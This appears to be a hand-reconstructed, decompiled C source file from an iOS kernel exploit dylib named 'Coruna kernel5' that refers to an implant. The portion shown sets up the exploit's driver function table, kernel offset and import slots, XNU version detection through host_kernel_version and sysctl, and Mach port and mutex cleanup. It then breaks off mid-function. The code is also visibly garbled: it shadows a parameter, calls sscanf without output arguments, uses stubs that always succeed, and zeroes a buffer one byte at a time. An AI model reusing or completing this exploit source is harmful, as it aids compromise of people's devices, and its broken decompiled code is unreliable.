/*
 * Coruna kernel exploit dylib (kernel5) â€” hand-reconstructed native C
 *
 * Rebuild: hand-reconstructed â€” skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
typedef struct { uint64_t q0; uint64_t q1; } coruna_svc_regpack_t;


static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Kernel module runtime constants (from Mach-O image) */
static uint64_t k_kernel_slot_1001;
static uint64_t k_kernel_slot_1888;
static uint64_t k_kernel_slot_1890;
static uint64_t k_kernel_slot_1898;
static uint64_t k_kernel_slot_18a0;
static uint64_t k_kernel_slot_18a8;
static uint64_t k_kernel_slot_18b0;
static uint64_t k_kernel_slot_18b8;
static uint64_t k_kernel_slot_18c0;
static uint64_t k_kernel_slot_18e0;
static uint64_t k_kernel_slot_18e8;
static uint64_t k_kernel_slot_18f0;
static uint64_t k_kernel_slot_18f8;
static uint64_t k_kernel_slot_1900;
static uint64_t k_kernel_slot_1908;
static uint64_t k_kernel_slot_1910;
static uint64_t k_kernel_slot_1914;
static uint64_t k_kernel_slot_1918;
static uint64_t k_kernel_slot_191c;
static uint64_t k_kernel_slot_1920;
static uint64_t k_kernel_slot_1924;
static uint64_t k_kernel_slot_1928;
static uint64_t k_kernel_slot_192c;
static uint64_t k_kernel_slot_1930;
static uint64_t k_kernel_slot_1934;
static uint64_t k_kernel_slot_1938;
static uint64_t k_kernel_slot_193c;
static uint64_t k_kernel_slot_1940;
static uint64_t k_kernel_slot_1944;
static uint64_t k_kernel_slot_1948;
static uint64_t k_kernel_slot_1958;
static uint64_t k_kernel_slot_1960;
static uint64_t k_kernel_slot_1990;
static uint64_t k_kernel_slot_1998;
static uint64_t k_kernel_slot_19a0;
static uint64_t k_kernel_slot_19a8;
static uint64_t k_kernel_slot_19d0;
static uint64_t k_kernel_slot_19d8;
static uint64_t k_kernel_slot_19e8;
static uint64_t k_kernel_slot_19f0;
static uint64_t k_kernel_slot_19f8;
static uint64_t k_kernel_slot_1a00;
static uint64_t k_kernel_slot_1a08;
static uint64_t k_kernel_slot_1a10;
static uint64_t k_kernel_slot_1a18;
static uint64_t k_kernel_slot_1d08;
static uint64_t k_kernel_slot_1d10;
static uint64_t k_kernel_slot_1d18;
static uint64_t k_kernel_slot_1d20;
static uint64_t k_kernel_slot_1d28;
static uint64_t k_kernel_slot_1d30;
static uint64_t k_kernel_slot_1d38;
static uint64_t k_kernel_slot_1d40;
static uint64_t k_kernel_slot_1d48;
static uint64_t k_kernel_slot_2240;
static uint64_t k_kernel_slot_2710;
static uint64_t k_kernel_slot_4001;
static uint64_t k_kernel_rodata_word_321d0 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_321d8 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_321e0 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_33670 = 0x0000002800000038ULL;
static uint64_t k_kernel_rodata_word_33678 = 0x0000006000000010ULL;
static uint64_t k_kernel_rodata_word_33680 = 0x0000001000000028ULL;
static uint64_t k_kernel_rodata_word_33688 = 0x0000001800000030ULL;
static uint64_t k_kernel_rodata_word_33690 = 0xeb00011f8b090109ULL;
static uint64_t k_kernel_rodata_word_336d0 = 0x0000000400000001ULL;
static uint64_t k_kernel_rodata_word_336d8 = 0x408f400000000000ULL;
static uint64_t k_kernel_rodata_word_336e0 = 0x408c200000000000ULL;
static uint64_t k_kernel_rodata_word_336e8 = 0x0013000000000000ULL;
static uint64_t k_kernel_rodata_word_33710 = 0x0000000200000014ULL;
static uint64_t k_kernel_rodata_word_33718 = 0x0013000d000b0007ULL;
static uint64_t k_kernel_rodata_word_33918 = 0x0000000200000b36ULL;
static uint64_t k_kernel_rodata_word_33920 = 0x412e848000000000ULL;
static uint64_t k_kernel_rodata_word_33928 = 0x0000007f00000000ULL;
static uint64_t k_kernel_rodata_word_33930 = 0x0000006300000003ULL;
static uint64_t k_kernel_rodata_word_33950 = 0x70000000020cdefaULL;
static uint64_t k_kernel_rodata_word_33958 = 0x0000000400000000ULL;
static uint64_t k_kernel_rodata_word_33960 = 0x0000000100000000ULL;
static uint64_t k_kernel_rodata_word_33980 = 0x408a980000000000ULL;
static uint64_t k_kernel_rodata_word_3d090;
static uint64_t k_kernel_rodata_word_3f002;
static uint64_t k_kernel_rodata_word_336a0 = 0x0000000000420000ULL;
static uint64_t k_kernel_rodata_word_336b0 = 0x0000000033000000ULL;
static uint64_t k_kernel_rodata_word_336f0 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_33700 = 0x0000000403020100ULL;
static uint64_t k_kernel_rodata_word_33940 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_33970 = 0x000000d300000007ULL;
static uint64_t k_kernel_rodata_word_33990 = 0xffff000000000000ULL;
static uint64_t k_kernel_rodata_word_339a0 = 0x0000002000000010ULL;
static uint64_t k_kernel_rodata_word_339b0 = 0x0000006000000050ULL;
static uint64_t k_kernel_rodata_word_339c0 = 0x000000e0000000c0ULL;
static uint64_t k_kernel_rodata_word_339d0 = 0x0000019000000170ULL;
static uint64_t k_kernel_rodata_word_339e0 = 0x0000040000000300ULL;
static uint64_t k_kernel_rodata_word_339f0 = 0x0000080000000680ULL;
static uint64_t k_kernel_rodata_word_339fc = 0x0000200000001800ULL;
static void *k_kernel_ndr_record_slot = (void *)0x8010000000000039ULL;
static void *k_kernel_sandbox_check_no_report_slot = (void *)0x801000000000003aULL;
static void *k_kernel_kernelversionstring_slot = (void *)0x801000000000003cULL;
static void *k_kernel_stack_chk_guard_slot = (void *)0x8010000000000042ULL;
static void *k_kernel_bootstrap_port_slot = (void *)0x8010000000000049ULL;
static void *k_kernel_dyldversionnumber_slot = (void *)0x8010000000000051ULL;
static void *k_kernel_kcfallocatordefault_slot = (void *)0x8010000000000061ULL;
static void *k_kernel_kcfallocatornull_slot = (void *)0x8010000000000062ULL;
static void *k_kernel_kcfbooleanfalse_slot = (void *)0x8010000000000063ULL;
static void *k_kernel_kcftypedictionarykeycallbacks_slot = (void *)0x8010000000000064ULL;
static void *k_kernel_kcftypedictionaryvaluecallbacks_slot = (void *)0x8010000000000065ULL;
static void *k_kernel_kiomasterportdefault_slot = (void *)0x8010000000000066ULL;
static void *k_kernel_mach_task_self_slot = (void *)0x8010000000000074ULL;
static void *k_kernel_vm_kernel_page_mask_slot = (void *)0x80100000000000c6ULL;
static void *k_kernel_vm_kernel_page_size_slot = (void *)0x80100000000000c7ULL;
static void *k_kernel_vm_page_mask_slot = (void *)0x80100000000000c9ULL;
static void *k_kernel_vm_page_shift_slot = (void *)0x80100000000000caULL;
static void *k_kernel_vm_page_size_slot = (void *)0x80100000000000cbULL;
void _driver(uint64_t *val)
{
  uint32_t *ptr;
  
  if ((val != (uint64_t *)0x0) && (ptr = _calloc(1,0x50), ptr != (uint32_t *)0x0)) {
    *ptr = 0x20002;
    ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_ctx_free_613c;
    ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_kernel5_residual_213;
    ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_call_pthread_mutex_destroy;
    ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_kernel5_residual_214;
    ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_call_mach_thread_self_3087c;
    ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_kernel5_residual_215;
    ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_kernel5_residual_216;
    ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_parse_xnu_processors;
    *val = ptr;
  }
  return;
}
void coruna_ctx_free_613c(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return;
  }
  return;
}
void coruna_ctx_free_6140(uint64_t *val)
{
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return;
}
void coruna_kernel5_residual_213(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t scratch;
  
  scratch = 0;
  if (((handle != 0) && (id_2 != (uint64_t *)0x0)) &&
     (err = coruna_kernel5_via_macho_data_const(&scratch), err == 0)) {
    *id_2 = scratch;
  }
  return;
}
void coruna_kernel5_residual_214(long handle,long addr_2,uint64_t val)
{
  if ((handle != 0) && (addr_2 != 0)) {
    coruna_kernel5_residual_273(addr_2,val);
  }
  return;
}
void coruna_call_mach_thread_self_3087c(long handle,long addr_2)
{
  if ((handle != 0) && (addr_2 != 0)) {
    coruna_mach_thread_self_3087c(addr_2);
  }
  return;
}
void coruna_call_mach_thread_self_3087c_62a4(uint64_t val,uint64_t id_2)
{
  coruna_mach_thread_self_3087c(id_2);
  return;
}
void coruna_call_pthread_mutex_destroy(long handle,long addr_2)
{
  if ((handle != 0) && (addr_2 != 0)) {
    coruna_pthread_mutex_destroy(addr_2);
  }
  return;
}
void coruna_call_pthread_mutex_destroy_62f4(uint64_t val,uint64_t id_2)
{
  coruna_pthread_mutex_destroy(id_2);
  return;
}
void coruna_kernel5_residual_215(long handle,long addr_2,int *flags)
{
  if ((((handle != 0) && (addr_2 != 0)) && (flags != (int *)0x0)) &&
     (1 < *(int *)(&k_kernel_slot_1918 + addr_2) + 1U)) {
    *flags = *(int *)(&k_kernel_slot_1918 + addr_2);
    return;
  }
  return;
}
void coruna_kernel5_residual_216(long handle,long *addr_2,uint32_t *size,int flags)
{
  long handle;
  long scratch;
  
  scratch = 0;
  if (((handle != 0) && (addr_2 != (long *)0x0)) &&
     (((size != (uint32_t *)0x0 && (flags != 0)) ||
      ((size == (uint32_t *)0x0 && (flags == 0)))))) {
    handle = *addr_2;
    if (handle == 0) {
      coruna_kernel5_via_helper_5d2c_32264(*(uint64_t *)(handle + 0x18),handle,0,&scratch);
    }
    if (flags != 0) {
      scratch = handle;
      coruna_kernel5_via_helper_5d2c_32264(*(uint64_t *)(handle + 0x28),handle,handle,*size,
                   *(uint64_t *)(size + 2));
    }
    *addr_2 = handle;
  }
  return;
}
void coruna_parse_xnu_processors(long handle,size_t *len)
{
  mach_port_t host;
  kern_return_t lk1;
  int err;
  char *ptr;
  size_t scratch;
  uint32_t bootargs;
  int thread_attr [2];
  char host_info [512];
  
  if (handle == 0) {
    return;
  }
  if (len == (size_t *)0x0) {
    return;
  }
  host_info[0x1e8] = '\0';
  host_info[0x1e9] = '\0';
  host_info[0x1ea] = '\0';
  host_info[0x1eb] = '\0';
  host_info[0x1ec] = '\0';
  host_info[0x1ed] = '\0';
  host_info[0x1ee] = '\0';
  host_info[0x1ef] = '\0';
  host_info[0x1e0] = '\0';
  host_info[0x1e1] = '\0';
  host_info[0x1e2] = '\0';
  host_info[0x1e3] = '\0';
  host_info[0x1e4] = '\0';
  host_info[0x1e5] = '\0';
  host_info[0x1e6] = '\0';
  host_info[0x1e7] = '\0';
  host_info[0x1f8] = '\0';
  host_info[0x1f9] = '\0';
  host_info[0x1fa] = '\0';
  host_info[0x1fb] = '\0';
  host_info[0x1fc] = '\0';
  host_info[0x1fd] = '\0';
  host_info[0x1fe] = '\0';
  host_info[0x1ff] = '\0';
  host_info[0x1f0] = '\0';
  host_info[0x1f1] = '\0';
  host_info[0x1f2] = '\0';
  host_info[499] = '\0';
  host_info[500] = '\0';
  host_info[0x1f5] = '\0';
  host_info[0x1f6] = '\0';
  host_info[0x1f7] = '\0';
  host_info[0x1c8] = '\0';
  host_info[0x1c9] = '\0';
  host_info[0x1ca] = '\0';
  host_info[0x1cb] = '\0';
  host_info[0x1cc] = '\0';
  host_info[0x1cd] = '\0';
  host_info[0x1ce] = '\0';
  host_info[0x1cf] = '\0';
  host_info[0x1c0] = '\0';
  host_info[0x1c1] = '\0';
  host_info[0x1c2] = '\0';
  host_info[0x1c3] = '\0';
  host_info[0x1c4] = '\0';
  host_info[0x1c5] = '\0';
  host_info[0x1c6] = '\0';
  host_info[0x1c7] = '\0';
  host_info[0x1d8] = '\0';
  host_info[0x1d9] = '\0';
  host_info[0x1da] = '\0';
  host_info[0x1db] = '\0';
  host_info[0x1dc] = '\0';
  host_info[0x1dd] = '\0';
  host_info[0x1de] = '\0';
  host_info[0x1df] = '\0';
  host_info[0x1d0] = '\0';
  host_info[0x1d1] = '\0';
  host_info[0x1d2] = '\0';
  host_info[0x1d3] = '\0';
  host_info[0x1d4] = '\0';
  host_info[0x1d5] = '\0';
  host_info[0x1d6] = '\0';
  host_info[0x1d7] = '\0';
  host_info[0x1a8] = '\0';
  host_info[0x1a9] = '\0';
  host_info[0x1aa] = '\0';
  host_info[0x1ab] = '\0';
  host_info[0x1ac] = '\0';
  host_info[0x1ad] = '\0';
  host_info[0x1ae] = '\0';
  host_info[0x1af] = '\0';
  host_info[0x1a0] = '\0';
  host_info[0x1a1] = '\0';
  host_info[0x1a2] = '\0';
  host_info[0x1a3] = '\0';
  host_info[0x1a4] = '\0';
  host_info[0x1a5] = '\0';
  host_info[0x1a6] = '\0';
  host_info[0x1a7] = '\0';
  host_info[0x1b8] = '\0';
  host_info[0x1b9] = '\0';
  host_info[0x1ba] = '\0';
  host_info[0x1bb] = '\0';
  host_info[0x1bc] = '\0';
  host_info[0x1bd] = '\0';
  host_info[0x1be] = '\0';
  host_info[0x1bf] = '\0';
  host_info[0x1b0] = '\0';
  host_info[0x1b1] = '\0';
  host_info[0x1b2] = '\0';
  host_info[0x1b3] = '\0';
  host_info[0x1b4] = '\0';
  host_info[0x1b5] = '\0';
  host_info[0x1b6] = '\0';
  host_info[0x1b7] = '\0';
  host_info[0x188] = '\0';
  host_info[0x189] = '\0';
  host_info[0x18a] = '\0';
  host_info[0x18b] = '\0';
  host_info[0x18c] = '\0';
  host_info[0x18d] = '\0';
  host_info[0x18e] = '\0';
  host_info[399] = '\0';
  host_info[0x180] = '\0';
  host_info[0x181] = '\0';
  host_info[0x182] = '\0';
  host_info[0x183] = '\0';
  host_info[0x184] = '\0';
  host_info[0x185] = '\0';
  host_info[0x186] = '\0';
  host_info[0x187] = '\0';
  host_info[0x198] = '\0';
  host_info[0x199] = '\0';
  host_info[0x19a] = '\0';
  host_info[0x19b] = '\0';
  host_info[0x19c] = '\0';
  host_info[0x19d] = '\0';
  host_info[0x19e] = '\0';
  host_info[0x19f] = '\0';
  host_info[400] = '\0';
  host_info[0x191] = '\0';
  host_info[0x192] = '\0';
  host_info[0x193] = '\0';
  host_info[0x194] = '\0';
  host_info[0x195] = '\0';
  host_info[0x196] = '\0';
  host_info[0x197] = '\0';
  host_info[0x168] = '\0';
  host_info[0x169] = '\0';
  host_info[0x16a] = '\0';
  host_info[0x16b] = '\0';
  host_info[0x16c] = '\0';
  host_info[0x16d] = '\0';
  host_info[0x16e] = '\0';
  host_info[0x16f] = '\0';
  host_info[0x160] = '\0';
  host_info[0x161] = '\0';
  host_info[0x162] = '\0';
  host_info[0x163] = '\0';
  host_info[0x164] = '\0';
  host_info[0x165] = '\0';
  host_info[0x166] = '\0';
  host_info[0x167] = '\0';
  host_info[0x178] = '\0';
  host_info[0x179] = '\0';
  host_info[0x17a] = '\0';
  host_info[0x17b] = '\0';
  host_info[0x17c] = '\0';
  host_info[0x17d] = '\0';
  host_info[0x17e] = '\0';
  host_info[0x17f] = '\0';
  host_info[0x170] = '\0';
  host_info[0x171] = '\0';
  host_info[0x172] = '\0';
  host_info[0x173] = '\0';
  host_info[0x174] = '\0';
  host_info[0x175] = '\0';
  host_info[0x176] = '\0';
  host_info[0x177] = '\0';
  host_info[0x148] = '\0';
  host_info[0x149] = '\0';
  host_info[0x14a] = '\0';
  host_info[0x14b] = '\0';
  host_info[0x14c] = '\0';
  host_info[0x14d] = '\0';
  host_info[0x14e] = '\0';
  host_info[0x14f] = '\0';
  host_info[0x140] = '\0';
  host_info[0x141] = '\0';
  host_info[0x142] = '\0';
  host_info[0x143] = '\0';
  host_info[0x144] = '\0';
  host_info[0x145] = '\0';
  host_info[0x146] = '\0';
  host_info[0x147] = '\0';
  host_info[0x158] = '\0';
  host_info[0x159] = '\0';
  host_info[0x15a] = '\0';
  host_info[0x15b] = '\0';
  host_info[0x15c] = '\0';
  host_info[0x15d] = '\0';
  host_info[0x15e] = '\0';
  host_info[0x15f] = '\0';
  host_info[0x150] = '\0';
  host_info[0x151] = '\0';
  host_info[0x152] = '\0';
  host_info[0x153] = '\0';
  host_info[0x154] = '\0';
  host_info[0x155] = '\0';
  host_info[0x156] = '\0';
  host_info[0x157] = '\0';
  host_info[0x128] = '\0';
  host_info[0x129] = '\0';
  host_info[0x12a] = '\0';
  host_info[299] = '\0';
  host_info[300] = '\0';
  host_info[0x12d] = '\0';
  host_info[0x12e] = '\0';
  host_info[0x12f] = '\0';
  host_info[0x120] = '\0';
  host_info[0x121] = '\0';
  host_info[0x122] = '\0';
  host_info[0x123] = '\0';
  host_info[0x124] = '\0';
  host_info[0x125] = '\0';
  host_info[0x126] = '\0';
  host_info[0x127] = '\0';
  host_info[0x138] = '\0';
  host_info[0x139] = '\0';
  host_info[0x13a] = '\0';
  host_info[0x13b] = '\0';
  host_info[0x13c] = '\0';
  host_info[0x13d] = '\0';
  host_info[0x13e] = '\0';
  host_info[0x13f] = '\0';
  host_info[0x130] = '\0';
  host_info[0x131] = '\0';
  host_info[0x132] = '\0';
  host_info[0x133] = '\0';
  host_info[0x134] = '\0';
  host_info[0x135] = '\0';
  host_info[0x136] = '\0';
  host_info[0x137] = '\0';
  host_info[0x108] = '\0';
  host_info[0x109] = '\0';
  host_info[0x10a] = '\0';
  host_info[0x10b] = '\0';
  host_info[0x10c] = '\0';
  host_info[0x10d] = '\0';
  host_info[0x10e] = '\0';
  host_info[0x10f] = '\0';
  host_info[0x100] = '\0';
  host_info[0x101] = '\0';
  host_info[0x102] = '\0';
  host_info[0x103] = '\0';
  host_info[0x104] = '\0';
  host_info[0x105] = '\0';
  host_info[0x106] = '\0';
  host_info[0x107] = '\0';
  host_info[0x118] = '\0';
  host_info[0x119] = '\0';
  host_info[0x11a] = '\0';
  host_info[0x11b] = '\0';
  host_info[0x11c] = '\0';
  host_info[0x11d] = '\0';
  host_info[0x11e] = '\0';
  host_info[0x11f] = '\0';
  host_info[0x110] = '\0';
  host_info[0x111] = '\0';
  host_info[0x112] = '\0';
  host_info[0x113] = '\0';
  host_info[0x114] = '\0';
  host_info[0x115] = '\0';
  host_info[0x116] = '\0';
  host_info[0x117] = '\0';
  host_info[0xe8] = '\0';
  host_info[0xe9] = '\0';
  host_info[0xea] = '\0';
  host_info[0xeb] = '\0';
  host_info[0xec] = '\0';
  host_info[0xed] = '\0';
  host_info[0xee] = '\0';
  host_info[0xef] = '\0';
  host_info[0xe0] = '\0';
  host_info[0xe1] = '\0';
  host_info[0xe2] = '\0';
  host_info[0xe3] = '\0';
  host_info[0xe4] = '\0';
  host_info[0xe5] = '\0';
  host_info[0xe6] = '\0';
  host_info[0xe7] = '\0';
  host_info[0xf8] = '\0';
  host_info[0xf9] = '\0';
  host_info[0xfa] = '\0';
  host_info[0xfb] = '\0';
  host_info[0xfc] = '\0';
  host_info[0xfd] = '\0';
  host_info[0xfe] = '\0';
  host_info[0xff] = '\0';
  host_info[0xf0] = '\0';
  host_info[0xf1] = '\0';
  host_info[0xf2] = '\0';
  host_info[0xf3] = '\0';
  host_info[0xf4] = '\0';
  host_info[0xf5] = '\0';
  host_info[0xf6] = '\0';
  host_info[0xf7] = '\0';
  host_info[200] = '\0';
  host_info[0xc9] = '\0';
  host_info[0xca] = '\0';
  host_info[0xcb] = '\0';
  host_info[0xcc] = '\0';
  host_info[0xcd] = '\0';
  host_info[0xce] = '\0';
  host_info[0xcf] = '\0';
  host_info[0xc0] = '\0';
  host_info[0xc1] = '\0';
  host_info[0xc2] = '\0';
  host_info[0xc3] = '\0';
  host_info[0xc4] = '\0';
  host_info[0xc5] = '\0';
  host_info[0xc6] = '\0';
  host_info[199] = '\0';
  host_info[0xd8] = '\0';
  host_info[0xd9] = '\0';
  host_info[0xda] = '\0';
  host_info[0xdb] = '\0';
  host_info[0xdc] = '\0';
  host_info[0xdd] = '\0';
  host_info[0xde] = '\0';
  host_info[0xdf] = '\0';
  host_info[0xd0] = '\0';
  host_info[0xd1] = '\0';
  host_info[0xd2] = '\0';
  host_info[0xd3] = '\0';
  host_info[0xd4] = '\0';
  host_info[0xd5] = '\0';
  host_info[0xd6] = '\0';
  host_info[0xd7] = '\0';
  host_info[0xa8] = '\0';
  host_info[0xa9] = '\0';
  host_info[0xaa] = '\0';
  host_info[0xab] = '\0';
  host_info[0xac] = '\0';
  host_info[0xad] = '\0';
  host_info[0xae] = '\0';
  host_info[0xaf] = '\0';
  host_info[0xa0] = '\0';
  host_info[0xa1] = '\0';
  host_info[0xa2] = '\0';
  host_info[0xa3] = '\0';
  host_info[0xa4] = '\0';
  host_info[0xa5] = '\0';
  host_info[0xa6] = '\0';
  host_info[0xa7] = '\0';
  host_info[0xb8] = '\0';
  host_info[0xb9] = '\0';
  host_info[0xba] = '\0';
  host_info[0xbb] = '\0';
  host_info[0xbc] = '\0';
  host_info[0xbd] = '\0';
  host_info[0xbe] = '\0';
  host_info[0xbf] = '\0';
  host_info[0xb0] = '\0';
  host_info[0xb1] = '\0';
  host_info[0xb2] = '\0';
  host_info[0xb3] = '\0';
  host_info[0xb4] = '\0';
  host_info[0xb5] = '\0';
  host_info[0xb6] = '\0';
  host_info[0xb7] = '\0';
  host_info[0x88] = '\0';
  host_info[0x89] = '\0';
  host_info[0x8a] = '\0';
  host_info[0x8b] = '\0';
  host_info[0x8c] = '\0';
  host_info[0x8d] = '\0';
  host_info[0x8e] = '\0';
  host_info[0x8f] = '\0';
  host_info[0x80] = '\0';
  host_info[0x81] = '\0';
  host_info[0x82] = '\0';
  host_info[0x83] = '\0';
  host_info[0x84] = '\0';
  host_info[0x85] = '\0';
  host_info[0x86] = '\0';
  host_info[0x87] = '\0';
  host_info[0x98] = '\0';
  host_info[0x99] = '\0';
  host_info[0x9a] = '\0';
  host_info[0x9b] = '\0';
  host_info[0x9c] = '\0';
  host_info[0x9d] = '\0';
  host_info[0x9e] = '\0';
  host_info[0x9f] = '\0';
  host_info[0x90] = '\0';
  host_info[0x91] = '\0';
  host_info[0x92] = '\0';
  host_info[0x93] = '\0';
  host_info[0x94] = '\0';
  host_info[0x95] = '\0';
  host_info[0x96] = '\0';
  host_info[0x97] = '\0';
  host_info[0x78] = '\0';
  host_info[0x79] = '\0';
  host_info[0x7a] = '\0';
  host_info[0x7b] = '\0';
  host_info[0x7c] = '\0';
  host_info[0x7d] = '\0';
  host_info[0x7e] = '\0';
  host_info[0x7f] = '\0';
  host_info[0x70] = '\0';
  host_info[0x71] = '\0';
  host_info[0x72] = '\0';
  host_info[0x73] = '\0';
  host_info[0x74] = '\0';
  host_info[0x75] = '\0';
  host_info[0x76] = '\0';
  host_info[0x77] = '\0';
  host_info[0x58] = '\0';
  host_info[0x59] = '\0';
  host_info[0x5a] = '\0';
  host_info[0x5b] = '\0';
  host_info[0x5c] = '\0';
  host_info[0x5d] = '\0';
  host_info[0x5e] = '\0';
  host_info[0x5f] = '\0';
  host_info[0x50] = '\0';
  host_info[0x51] = '\0';
  host_info[0x52] = '\0';
  host_info[0x53] = '\0';
  host_info[0x54] = '\0';
  host_info[0x55] = '\0';
  host_info[0x56] = '\0';
  host_info[0x57] = '\0';
  host_info[0x68] = '\0';
  host_info[0x69] = '\0';
  host_info[0x6a] = '\0';
  host_info[0x6b] = '\0';
  host_info[0x6c] = '\0';
  host_info[0x6d] = '\0';
  host_info[0x6e] = '\0';
  host_info[0x6f] = '\0';
  host_info[0x60] = '\0';
  host_info[0x61] = '\0';
  host_info[0x62] = '\0';
  host_info[99] = '\0';
  host_info[100] = '\0';
  host_info[0x65] = '\0';
  host_info[0x66] = '\0';
  host_info[0x67] = '\0';
  host_info[0x38] = '\0';
  host_info[0x39] = '\0';
  host_info[0x3a] = '\0';
  host_info[0x3b] = '\0';
  host_info[0x3c] = '\0';
  host_info[0x3d] = '\0';
  host_info[0x3e] = '\0';
  host_info[0x3f] = '\0';
  host_info[0x30] = '\0';
  host_info[0x31] = '\0';
  host_info[0x32] = '\0';
  host_info[0x33] = '\0';
  host_info[0x34] = '\0';
  host_info[0x35] = '\0';
  host_info[0x36] = '\0';
  host_info[0x37] = '\0';
  host_info[0x48] = '\0';
  host_info[0x49] = '\0';
  host_info[0x4a] = '\0';
  host_info[0x4b] = '\0';
  host_info[0x4c] = '\0';
  host_info[0x4d] = '\0';
  host_info[0x4e] = '\0';
  host_info[0x4f] = '\0';
  host_info[0x40] = '\0';
  host_info[0x41] = '\0';
  host_info[0x42] = '\0';
  host_info[0x43] = '\0';
  host_info[0x44] = '\0';
  host_info[0x45] = '\0';
  host_info[0x46] = '\0';
  host_info[0x47] = '\0';
  host_info[0x18] = '\0';
  host_info[0x19] = '\0';
  host_info[0x1a] = '\0';
  host_info[0x1b] = '\0';
  host_info[0x1c] = '\0';
  host_info[0x1d] = '\0';
  host_info[0x1e] = '\0';
  host_info[0x1f] = '\0';
  host_info[0x10] = '\0';
  host_info[0x11] = '\0';
  host_info[0x12] = '\0';
  host_info[0x13] = '\0';
  host_info[0x14] = '\0';
  host_info[0x15] = '\0';
  host_info[0x16] = '\0';
  host_info[0x17] = '\0';
  host_info[0x28] = '\0';
  host_info[0x29] = '\0';
  host_info[0x2a] = '\0';
  host_info[0x2b] = '\0';
  host_info[0x2c] = '\0';
  host_info[0x2d] = '\0';
  host_info[0x2e] = '\0';
  host_info[0x2f] = '\0';
  host_info[0x20] = '\0';
  host_info[0x21] = '\0';
  host_info[0x22] = '\0';
  host_info[0x23] = '\0';
  host_info[0x24] = '\0';
  host_info[0x25] = '\0';
  host_info[0x26] = '\0';
  host_info[0x27] = '\0';
  host_info[8] = '\0';
  host_info[9] = '\0';
  host_info[10] = '\0';
  host_info[0xb] = '\0';
  host_info[0xc] = '\0';
  host_info[0xd] = '\0';
  host_info[0xe] = '\0';
  host_info[0xf] = '\0';
  host_info[0] = '\0';
  host_info[1] = '\0';
  host_info[2] = '\0';
  host_info[3] = '\0';
  host_info[4] = '\0';
  host_info[5] = '\0';
  host_info[6] = '\0';
  host_info[7] = '\0';
  host = _mach_host_self();
  lk1 = _host_kernel_version(host,host_info);
  if (lk1 != 0) {
    if (lk1 != 0x35) {
      return;
    }
    thread_attr[0] = 1;
    thread_attr[1] = 4;
    scratch = 0x200;
    err = _sysctl(thread_attr,2,host_info,&scratch,(void *)0x0,0);
    if (err != 0) {
      return;
    }
  }
  ptr = _strstr(host_info,"RELEASE");
  if ((ptr != (char *)0x0) && (ptr = _strstr(host_info,"xnu-"), ptr != (char *)0x0)) {
    bootargs = 0;
    scratch = 0;
    err = _sscanf(ptr,"xnu-%u.%u.%u%*s");
    if (err == 3) {
      *len = scratch;
      *(uint32_t *)(len + 1) = bootargs;
    }
  }
  return;
}
void coruna_pthread_mutexattr_settype(long handle)
{
  pthread_mutexattr_t *ptr;
  int err;
  
  ptr = (pthread_mutexattr_t *)(handle + 0x110);
  err = _pthread_mutexattr_init(ptr);
  if ((err == 0) && (err = _pthread_mutexattr_settype(ptr,1), err == 0)) {
    _pthread_mutex_init((pthread_mutex_t *)(handle + 0xd0),ptr);
  }
  return;
}
void coruna_kernel5_via_pthread_mutexattr_destroy(long handle)
{
  int err;
  
  if (*(char *)(handle + 0x121) != '\0') {
    err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
    if (err == 0) {
      *(uint8_t *)(handle + 0x120) = 1;
    }
    coruna_pthread_mutexattr_destroy(handle,1);
  }
  return;
}
void coruna_pthread_mutexattr_destroy(uint64_t *val,int flags)
{
  vm_address_t address;
  
  address = val[0x11];
  if ((address != 0) && (val[0x12] != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,val[0x12]);
  }
  val[0x11] = 0;
  val[0x12] = 0;
  if (flags == 0) {
    val[0x15] = 0;
    val[0x16] = 0;
  }
  else {
    if (1 < *(mach_port_name_t *)(val + 0x13) + 1) {
      _mach_port_deallocate
                (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(val + 0x13)
                );
      *(uint32_t *)(val + 0x13) = 0;
    }
    if (1 < *(mach_port_name_t *)((long)val + 0x9c) + 1) {
      _mach_port_deallocate
                (*(ipc_space_t *)k_kernel_mach_task_self_slot,
                 *(mach_port_name_t *)((long)val + 0x9c));
      *(uint32_t *)((long)val + 0x9c) = 0;
    }
    if (val[0xe] != 0) {
      _CFRelease();
      val[0xe] = 0;
    }
